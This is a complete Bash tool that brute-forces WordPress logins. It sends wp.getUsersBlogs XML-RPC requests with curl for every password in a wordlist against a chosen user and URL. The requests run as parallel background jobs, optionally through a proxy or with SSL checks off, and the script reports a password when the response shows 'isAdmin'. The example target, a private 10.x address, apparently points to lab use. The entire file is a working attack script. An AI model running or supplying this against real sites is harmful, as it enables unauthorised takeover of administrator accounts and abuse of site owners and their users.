#!/bin/bash

# Colores
greenColour="\033[0;32m\033[1m"
endColour="\033[0m\033[0m"
redColour="\033[0;31m\033[1m"
blueColour="\033[0;34m\033[1m"
yellowColour="\033[0;33m\033[1m"
purpleColour="\033[0;35m\033[1m"
turquoiseColour="\033[0;36m\033[1m"
grayColour="\033[0;37m\033[1m"


function ctrl_c(){
  echo -e "\n\n${redColour}[!] Exiting...${endColour}\n"
  tput cnorm; exit 1
}

# Ctrl+C
trap ctrl_c SIGINT

function helpPanel(){
  echo -e "\n${yellowColour}[+]${grayColour} Use:${blueColour} $0${turquoiseColour} -t${redColour} target url${turquoiseColour} -u${redColour} username${turquoiseColour} -w${redColour} wordlist_path${endColour}\n"
  echo -e "\t${purpleColour}-t)${grayColour} Target url: http[s]://10.10.198.112:8080/wordpress/xmlrpc.php${endColour}"
  echo -e "\t${purpleColour}-u)${grayColour} User to check${endColour}"
  echo -e "\t${purpleColour}-w)${grayColour} Path to passwords wordlist${endColour}"
  echo -e "\t${purpleColour}-x)${grayColour} Add proxy (optional), for example: http://localhost:8080 for BurpSuite${endColour}"
  echo -e "\t${purpleColour}-k)${grayColour} Insecure server connections when using SSL anda haves certificate errors${endColour}"
  tput cnorm; exit 1
}

proxy=""

function Proxy(){
  proxy="http://localhost:8080"
}

nossl=""

function noSSl(){
  nossl="-k"
}

declare -i parameter_counter=0

tput civis

while getopts "t:u:w:x,k,h" arg; do
  case $arg in
    t) url=$OPTARG && let parameter_counter+=1;;
    u) username=$OPTARG && let parameter_counter+=1;; 
    w) wordlist=$OPTARG && let parameter_counter+=1;;
    x) Proxy;;
    k) noSSl;;
    h) helpPanel
  esac
done

function makeXML(){
  url=$1
  username=$2
  password=$3
  
  if [ $(echo $url | grep "https://") ]; then
    nossl="-k"    
  fi
    
  xmlData="""<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>${username}</value></param><param><value>${password}</value></param></params></methodCall>"""

  if [ "$(curl -s -X POST -x "$proxy" "$url" -d "$xmlData" $nossl | grep 'isAdmin')" ]; then
    echo -e "\n\n${yellowColour}[+] ${grayColour}The password is:    ${blueColour}$password${endColour}\n"
    tput cnorm && kill -s SIGINT $$ 2>/dev/null
  fi
}

if [ $parameter_counter -eq 3 ]; then
  if [ -f $wordlist ]; then
    topCounter=100
    counter=0
    echo -e "${yellowColour}\n[*]${purpleColour} Bruteforcing...\n${endColour}"
    while read password; do
      makeXML $url $username $password $proxy $nossl &
      sleep 0.05
      let counter+=1
      if [ $counter -eq $topCounter ]; then
          echo -ne "\t--> Tested  $counter  passwords <--\r"
          let topCounter+=100
      fi
    done < $wordlist
  else
    echo -e "\n\n${redColour}[!] File not found${endColour}\n"
    tput cnorm && exit 1
  fi
    
else
  helpPanel
fi

sleep 2
tput cnorm
